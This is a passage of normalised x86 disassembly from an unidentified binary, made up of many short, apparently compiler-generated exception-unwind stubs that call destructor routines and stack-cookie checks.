lea ecx [ ebp + 0x1c ]
jmp sub_410038
sub_43aeb0
lea ecx [ ebp ]
jmp sub_410038
sub_43aeb8
lea ecx [ ebp + 0x38 ]
jmp sub_410038
sub_43aec0
lea ecx [ ebp + 0x1c ]
jmp sub_410038
sub_43aec8
lea ecx [ ebp ]
jmp sub_410038
sub_43aed0
lea ecx [ ebp ]
jmp sub_410038
sub_43aed8
lea ecx [ ebp + 0x1c ]
jmp sub_410038
sub_43aee0
lea ecx [ ebp ]
jmp sub_410038
sub_43aee8
lea ecx [ ebp - 0x28 ]
jmp sub_410038
sub_43aef0
lea ecx [ ebp + 0x38 ]
jmp sub_410038
sub_43aef8
lea ecx [ ebp + 0x1c ]
jmp sub_410038
sub_43af00
lea ecx [ ebp - 0x28 ]
jmp sub_410038
sub_43af08
lea ecx [ ebp + 0x38 ]
jmp sub_410038
sub_43af10
lea ecx [ ebp + 0x1c ]
jmp sub_410038
sub_43af18
lea ecx [ ebp - 0x28 ]
jmp sub_410038
sub_43af20
lea ecx [ ebp + 0x38 ]
jmp sub_410038
sub_43af28
lea ecx [ ebp + 0x1c ]
jmp sub_410038
sub_43af30
lea ecx [ ebp - 0x28 ]
jmp sub_410038
sub_43af38
lea ecx [ ebp + 0x38 ]
jmp sub_410038
sub_43af40
lea ecx [ ebp + 0x1c ]
jmp sub_410038
sub_43af48
lea ecx [ ebp - 0x60 ]
jmp sub_410038
sub_43af50
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x80 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43af6b
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43af73
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43af8e
mov ecx [ ebp + 0x8 ]
jmp sub_410620
sub_43af96
mov ecx [ ebp + 0x8 ]
add ecx 0x8
jmp sub_410038
sub_43afa1
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
lea ecx [ ebp - 0x30 ]
jmp sub_410038
sub_43afba
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43afd5
mov ecx [ ebp + 0x8 ]
jmp sub_40fa96
sub_43afdd
mov eax [ ebp + 0x8 ]
add eax 0x30
jmp sub_417010
sub_43afe8
mov eax [ ebp + 0x8 ]
add eax 0x34
jmp sub_417010
sub_43aff3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b00e
lea ecx [ ebp - 0x30 ]
jmp sub_410038
sub_43b016
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b031
lea ecx [ ebp - 0x34 ]
jmp sub_410038
sub_43b039
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4c ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b054
lea ecx [ ebp - 0x44 ]
jmp sub_410038
sub_43b05c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b077
push [ ebp - 0x10 ]
call sub_42412e
pop ecx
retn
sub_43b081
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b09c
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
lea ecx [ ebp - 0x3c ]
jmp sub_410038
sub_43b0b5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b0d0
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43b0d8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b0f3
lea ecx [ ebp + 0x54 ]
jmp sub_410038
sub_43b0fb
lea ecx [ ebp + 0x38 ]
jmp sub_410038
sub_43b103
lea ecx [ ebp + 0x1c ]
jmp sub_410038
sub_43b10b
lea ecx [ ebp + 0x1c ]
jmp sub_410038
sub_43b113
lea ecx [ ebp + 0x38 ]
jmp sub_410038
sub_43b11b
lea ecx [ ebp + 0x54 ]
jmp sub_410038
sub_43b123
lea ecx [ ebp + 0x1c ]
jmp sub_410038
sub_43b12b
lea ecx [ ebp + 0x38 ]
jmp sub_410038
sub_43b133
lea ecx [ ebp + 0x54 ]
jmp sub_410038
sub_43b13b
lea ecx [ ebp + 0x1c ]
jmp sub_410038
sub_43b143
lea ecx [ ebp + 0x38 ]
jmp sub_410038
sub_43b14b
lea ecx [ ebp + 0x54 ]
jmp sub_410038
sub_43b153
lea ecx [ ebp + 0x1c ]
jmp sub_410038
sub_43b15b
lea ecx [ ebp + 0x38 ]
jmp sub_410038
sub_43b163
lea ecx [ ebp + 0x54 ]
jmp sub_410038
sub_43b16b
lea ecx [ ebp + 0x1c ]
jmp sub_410038
sub_43b173
lea ecx [ ebp + 0x38 ]
jmp sub_410038
sub_43b17b
lea ecx [ ebp + 0x54 ]
jmp sub_410038
sub_43b183
lea ecx [ ebp - 0x44 ]
jmp sub_410038
sub_43b18b
lea ecx [ ebp - 0x28 ]
jmp sub_410038
sub_43b193
lea ecx [ ebp ]
jmp sub_410038
sub_43b19b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b1b6
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43b1be
lea ecx [ ebp - 0x4c ]
jmp sub_410038
sub_43b1c6
lea ecx [ ebp - 0x68 ]
jmp sub_410038
sub_43b1ce
lea ecx [ ebp - 0xa0 ]
jmp sub_410038
sub_43b1d9
lea ecx [ ebp - 0x84 ]
jmp sub_410038
sub_43b1e4
lea ecx [ ebp - 0x68 ]
jmp sub_410038
sub_43b1ec
lea ecx [ ebp - 0x4c ]
jmp sub_410038
sub_43b1f4
lea ecx [ ebp - 0x84 ]
jmp sub_410038
sub_43b1ff
lea ecx [ ebp - 0xa0 ]
jmp sub_410038
sub_43b20a
lea ecx [ ebp - 0x68 ]
jmp sub_410038
sub_43b212
lea ecx [ ebp - 0x4c ]
jmp sub_410038
sub_43b21a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa4 ]
xor ecx eax
call sub_4234de
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b242
lea ecx [ ebp - 0x48 ]
jmp sub_410038
sub_43b24a
lea ecx [ ebp - 0x48 ]
jmp sub_410038
sub_43b252
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43b25a
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4c ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b275
push [ ebp - 0x14 ]
call sub_42412e
pop ecx
retn
sub_43b27f
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x30 ]
jmp sub_410038
sub_43b298
mov eax [ ebp - 0x10 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffd
lea eax [ ebp - 0xa4 ]
push eax
call sub_406082
sub_43b2b5
mov ecx [ ebp - 0x14 ]
jmp sub_4061b0
sub_43b2bd
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa8 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b2db
push [ ebp - 0x14 ]
call sub_42412e
pop ecx
retn
sub_43b2e5
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x30 ]
jmp sub_410038
sub_43b2fe
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa8 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b31c
lea ecx [ ebp - 0x38 ]
jmp sub_4061b7
sub_43b324
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43b32c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_4234de
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b351
lea ecx [ ebp - 0x74 ]
jmp sub_4061b7
sub_43b359
lea ecx [ ebp - 0x4c ]
jmp sub_410038
sub_43b361
lea ecx [ ebp - 0x30 ]
jmp sub_410038
sub_43b369
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x7c ]
xor ecx eax
call sub_4234de
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b38e
lea ecx [ ebp - 0x30 ]
jmp sub_4061b7
sub_43b396
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43b39e
lea ecx [ ebp - 0x60 ]
jmp sub_410038
sub_43b3a6
lea ecx [ ebp - 0x60 ]
jmp sub_410038
sub_43b3ae
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_4234de
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b3d3
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43b3db
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43b3e3
lea ecx [ ebp - 0x48 ]
jmp sub_410038
sub_43b3eb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_4234de
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b410
mov ecx [ ebp + 0x8 ]
jmp sub_4238ce
sub_43b418
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b433
push [ ebp - 0x14 ]
call sub_42412e
pop ecx
retn
sub_43b43d
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x30 ]
jmp sub_410038
sub_43b456
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xb8 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b474
lea ecx [ ebp + 0x38 ]
jmp sub_410038
sub_43b47c
lea ecx [ ebp + 0x1c ]
jmp sub_410038
sub_43b484
lea ecx [ ebp ]
jmp sub_410038
sub_43b48c
lea ecx [ ebp + 0x38 ]
jmp sub_410038
sub_43b494
lea ecx [ ebp + 0x38 ]
jmp sub_410038
sub_43b49c
lea ecx [ ebp ]
jmp sub_410038
sub_43b4a4
lea ecx [ ebp + 0x1c ]
jmp sub_410038
sub_43b4ac
lea ecx [ ebp + 0x38 ]
jmp sub_410038
sub_43b4b4
lea ecx [ ebp ]
jmp sub_410038
sub_43b4bc
lea ecx [ ebp + 0x1c ]
jmp sub_410038
sub_43b4c4
lea ecx [ ebp + 0x38 ]
jmp sub_410038
sub_43b4cc
lea ecx [ ebp ]
jmp sub_410038
sub_43b4d4
lea ecx [ ebp + 0x1c ]
jmp sub_410038
sub_43b4dc
lea ecx [ ebp + 0x38 ]
jmp sub_410038
sub_43b4e4
lea ecx [ ebp ]
jmp sub_410038
sub_43b4ec
lea ecx [ ebp + 0x1c ]
jmp sub_410038
sub_43b4f4
mov eax [ ebp + 0x58 ]
and eax 0x1
je r-xdata
retn
and [ ebp + 0x58 ] 0xfffffffe
lea ecx [ ebp - 0x124 ]
jmp sub_410038
sub_43b510
mov eax [ ebp + 0x58 ]
and eax 0x2
je r-xdata
retn
and [ ebp + 0x58 ] 0xfffffffd
lea ecx [ ebp - 0xec ]
jmp sub_410038
sub_43b52c
mov eax [ ebp + 0x58 ]
and eax 0x4
je r-xdata
retn
and [ ebp + 0x58 ] 0xfffffffb
lea ecx [ ebp - 0xb4 ]
jmp sub_410038
sub_43b548
mov eax [ ebp + 0x58 ]
and eax 0x8
je r-xdata
retn
and [ ebp + 0x58 ] 0xfffffff7
lea ecx [ ebp - 0x7c ]
jmp sub_410038
sub_43b561
mov eax [ ebp + 0x58 ]
and eax 0x10
je r-xdata
retn
and [ ebp + 0x58 ] 0xffffffef
lea ecx [ ebp - 0x44 ]
jmp sub_410038
sub_43b57a
mov eax [ ebp + 0x58 ]
and eax 0x20
je r-xdata
retn
and [ ebp + 0x58 ] 0xffffffdf
lea ecx [ ebp - 0x108 ]
jmp sub_410038
sub_43b596
mov eax [ ebp + 0x58 ]
and eax 0x40
je r-xdata
retn
and [ ebp + 0x58 ] 0xffffffbf
lea ecx [ ebp - 0x98 ]
jmp sub_410038
sub_43b5b2
mov eax [ ebp + 0x58 ]
and eax 0x80
je r-xdata
retn
and [ ebp + 0x58 ] 0xffffff7f
lea ecx [ ebp - 0x28 ]
jmp sub_410038
sub_43b5d0
mov eax [ ebp + 0x58 ]
and eax 0x100
je r-xdata
retn
and [ ebp + 0x58 ] 0xfffffeff
lea ecx [ ebp - 0x60 ]
jmp sub_410038
sub_43b5ee
mov eax [ ebp + 0x58 ]
and eax 0x200
je r-xdata
retn
and [ ebp + 0x58 ] 0xfffffdff
lea ecx [ ebp - 0xd0 ]
jmp sub_410038
sub_43b60f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x128 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b62d
push [ ebp + 0x8 ]
call sub_42412e
pop ecx
retn
sub_43b637
push [ ebp + 0x8 ]
call sub_42412e
pop ecx
retn
sub_43b641
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b65c
lea ecx [ ebp - 0x4c ]
jmp sub_410038
sub_43b664
lea ecx [ ebp - 0x30 ]
jmp sub_410038
sub_43b66c
lea ecx [ ebp - 0x30 ]
jmp sub_410038
sub_43b674
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xa4 ]
mov ecx [ edx - 0xa8 ]
xor ecx eax
call sub_4234de
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b6a2
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43b6aa
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8c ]
xor ecx eax
call sub_4234de
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b6d2
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43b6da
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x80 ]
xor ecx eax
call sub_4234de
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b6ff
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43b707
lea ecx [ ebp - 0x48 ]
jmp sub_410038
sub_43b70f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8c ]
xor ecx eax
call sub_4234de
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b737
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
lea ecx [ ebp - 0x58 ]
jmp sub_410038
sub_43b750
mov eax [ ebp - 0x14 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffd
lea ecx [ ebp - 0x3c ]
jmp sub_410038
sub_43b769
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b784
mov eax [ ebp - 0x3c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x3c ] 0xfffffffe
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43b79d
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x3c ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b7b8
mov eax [ ebp - 0x64 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x64 ] 0xfffffffe
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43b7d1
mov eax [ ebp - 0x64 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x64 ] 0xfffffffd
lea ecx [ ebp - 0x48 ]
jmp sub_410038
sub_43b7ea
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x6c ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b805
mov eax [ ebp - 0x44 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x44 ] 0xfffffffe
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43b81e
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4c ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b839
mov eax [ ebp - 0xbc ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0xbc ] 0xfffffffe
lea ecx [ ebp - 0x9c ]
jmp sub_410038
sub_43b85b
mov eax [ ebp - 0xbc ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0xbc ] 0xfffffffd
lea ecx [ ebp - 0x9c ]
jmp sub_410038
sub_43b87d
mov eax [ ebp - 0xbc ]
and eax 0x4
je r-xdata
retn
and [ ebp - 0xbc ] 0xfffffffb
lea ecx [ ebp - 0x64 ]
jmp sub_410038
sub_43b89c
mov eax [ ebp - 0xbc ]
and eax 0x8
je r-xdata
retn
and [ ebp - 0xbc ] 0xfffffff7
lea ecx [ ebp - 0x80 ]
jmp sub_410038
sub_43b8bb
lea esi [ ebp - 0x48 ]
jmp sub_4049b2
sub_43b8c3
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xbc ]
mov ecx [ edx - 0xc0 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b8e4
mov eax [ ebp - 0x10 ]
add eax 0x4
jmp sub_418e9c
sub_43b8ef
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp sub_410038
sub_43b8fa
mov ecx [ ebp - 0x10 ]
add ecx 0x3c
jmp sub_410038
sub_43b905
mov eax [ ebp - 0x10 ]
add eax 0x58
jmp sub_416fc8
sub_43b910
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b92b
mov eax [ ebp + 0x8 ]
add eax 0x4
jmp sub_418e9c
sub_43b936
mov ecx [ ebp + 0x8 ]
add ecx 0x20
jmp sub_410038
sub_43b941
mov ecx [ ebp + 0x8 ]
add ecx 0x3c
jmp sub_410038
sub_43b94c
mov eax [ ebp + 0x8 ]
add eax 0x58
jmp sub_416fc8
sub_43b957
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b972
mov eax [ ebp + 0x8 ]
add eax 0x4
jmp sub_418e9c
sub_43b97d
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43b996
mov ecx [ ebp + 0x8 ]
add ecx 0x20
jmp sub_410038
sub_43b9a1
mov eax [ ebp - 0x10 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0x48 ]
jmp sub_410038
sub_43b9ba
mov ecx [ ebp + 0x8 ]
add ecx 0x3c
jmp sub_410038
sub_43b9c5
mov eax [ ebp + 0x8 ]
add eax 0x58
jmp sub_416fc8
sub_43b9d0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43b9eb
mov eax [ ebp + 0x8 ]
add eax 0x4
jmp sub_418e9c
sub_43b9f6
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43ba0f
mov ecx [ ebp + 0x8 ]
add ecx 0x20
jmp sub_410038
sub_43ba1a
mov eax [ ebp - 0x10 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0x48 ]
jmp sub_410038
sub_43ba33
mov ecx [ ebp + 0x8 ]
add ecx 0x3c
jmp sub_410038
sub_43ba3e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43ba59
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43ba74
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x3c ]
jmp sub_410038
sub_43ba8d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43baa8
push [ ebp + 0x54 ]
call sub_42412e
pop ecx
retn
sub_43bab2
mov eax [ ebp + 0x58 ]
and eax 0x1
je r-xdata
retn
and [ ebp + 0x58 ] 0xfffffffe
lea ecx [ ebp ]
jmp sub_410038
sub_43bacb
mov eax [ ebp + 0x58 ]
and eax 0x2
je r-xdata
retn
and [ ebp + 0x58 ] 0xfffffffd
lea ecx [ ebp - 0x28 ]
jmp sub_410038
sub_43bae4
lea ecx [ ebp + 0x38 ]
jmp sub_410038
sub_43baec
lea ecx [ ebp + 0x1c ]
jmp sub_410038
sub_43baf4
lea ecx [ ebp + 0x1c ]
jmp sub_410038
sub_43bafc
lea ecx [ ebp + 0x38 ]
jmp sub_410038
sub_43bb04
lea ecx [ ebp - 0x44 ]
jmp sub_410038
sub_43bb0c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43bb27
lea eax [ ebp - 0x4c ]
jmp sub_403f2c
sub_43bb2f
lea ecx [ ebp - 0x30 ]
jmp sub_410038
sub_43bb37
lea ecx [ ebp - 0x84 ]
jmp sub_410038
sub_43bb42
lea ecx [ ebp - 0x68 ]
jmp sub_410038
sub_43bb4a
lea ecx [ ebp - 0x84 ]
jmp sub_410038
sub_43bb55
lea ecx [ ebp - 0x68 ]
jmp sub_410038
sub_43bb5d
lea ecx [ ebp - 0x84 ]
jmp sub_410038
sub_43bb68
lea ecx [ ebp - 0x84 ]
jmp sub_410038
sub_43bb73
lea ecx [ ebp - 0x68 ]
jmp sub_410038
sub_43bb7b
lea ecx [ ebp - 0x84 ]
jmp sub_410038
sub_43bb86
lea ecx [ ebp - 0x68 ]
jmp sub_410038
sub_43bb8e
lea ecx [ ebp - 0x84 ]
jmp sub_410038
sub_43bb99
lea ecx [ ebp - 0x68 ]
jmp sub_410038
sub_43bba1
lea ecx [ ebp - 0x84 ]
jmp sub_410038
sub_43bbac
lea ecx [ ebp - 0x68 ]
jmp sub_410038
sub_43bbb4
lea ecx [ ebp - 0x84 ]
jmp sub_410038
sub_43bbbf
lea ecx [ ebp - 0x68 ]
jmp sub_410038
sub_43bbc7
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x9c ]
mov ecx [ edx - 0xa0 ]
xor ecx eax
call sub_4234de
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43bbf5
push [ ebp - 0x40 ]
call sub_42412e
pop ecx
retn
sub_43bbff
lea ecx [ ebp - 0x30 ]
jmp sub_410038
sub_43bc07
lea ecx [ ebp - 0x30 ]
jmp sub_410038
sub_43bc0f
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x44 ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43bc2a
mov eax [ ebp + 0x8 ]
add eax 0x4
jmp sub_403f2c
sub_43bc35
mov eax [ ebp - 0x10 ]
jmp sub_416fe7
sub_43bc3d
mov eax [ ebp + 0x8 ]
add eax 0x20
push eax
call j_sub_40fb35
retn
sub_43bc4a
mov ecx [ ebp + 0x8 ]
add ecx 0x44
jmp sub_410038
sub_43bc55
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43bc70
mov ecx [ ebp + 0x8 ]
jmp sub_40498e
sub_43bc78
mov eax [ ebp + 0xc ]
jmp sub_416fe7
sub_43bc80
mov eax [ ebp + 0x8 ]
add eax 0x8
push eax
call j_sub_40fb35
retn
sub_43bc8d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43bca8
push [ ebp - 0x14 ]
call sub_42412e
pop ecx
retn
sub_43bcb2
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x30 ]
jmp sub_410038
sub_43bccb
push [ ebp - 0x14 ]
call sub_42412e
pop ecx
retn
sub_43bcd5
mov eax [ ebp - 0x10 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0x4c ]
jmp sub_410038
sub_43bcee
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43bd09
push [ ebp + 0x5c ]
call sub_42412e
pop ecx
retn
sub_43bd13
mov eax [ ebp + 0x60 ]
and eax 0x1
je r-xdata
retn
and [ ebp + 0x60 ] 0xfffffffe
lea ecx [ ebp + 0x1c ]
jmp sub_410038
sub_43bd2c
mov eax [ ebp + 0x60 ]
and eax 0x2
je r-xdata
retn
and [ ebp + 0x60 ] 0xfffffffd
lea ecx [ ebp ]
jmp sub_410038
sub_43bd45
lea ecx [ ebp + 0x38 ]
jmp sub_410038
sub_43bd4d
push [ ebp + 0x5c ]
call sub_42412e
pop ecx
retn
sub_43bd57
mov eax [ ebp + 0x60 ]
and eax 0x4
je r-xdata
retn
and [ ebp + 0x60 ] 0xfffffffb
lea ecx [ ebp - 0x44 ]
jmp sub_410038
sub_43bd70
mov eax [ ebp + 0x60 ]
and eax 0x8
je r-xdata
retn
and [ ebp + 0x60 ] 0xfffffff7
lea ecx [ ebp + 0x38 ]
jmp sub_410038
sub_43bd89
lea ecx [ ebp + 0x1c ]
jmp sub_410038
sub_43bd91
push [ ebp + 0x58 ]
call sub_42412e
pop ecx
retn
sub_43bd9b
mov eax [ ebp + 0x60 ]
and eax 0x10
je r-xdata
retn
and [ ebp + 0x60 ] 0xffffffef
lea ecx [ ebp - 0x28 ]
jmp sub_410038
sub_43bdb4
push [ ebp + 0x58 ]
call sub_42412e
pop ecx
retn
sub_43bdbe
mov eax [ ebp + 0x60 ]
and eax 0x20
je r-xdata
retn
and [ ebp + 0x60 ] 0xffffffdf
lea ecx [ ebp - 0x60 ]
jmp sub_410038
sub_43bdd7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43bdf2
mov ecx [ ebp - 0x10 ]
jmp sub_40498e
sub_43bdfa
mov ecx [ ebp - 0x10 ]
add ecx 0x8
jmp sub_410038
sub_43be05
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43be20
mov ecx [ ebp + 0x8 ]
jmp sub_40498e
sub_43be28
mov ecx [ ebp + 0x8 ]
add ecx 0x8
jmp sub_410038
sub_43be33
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
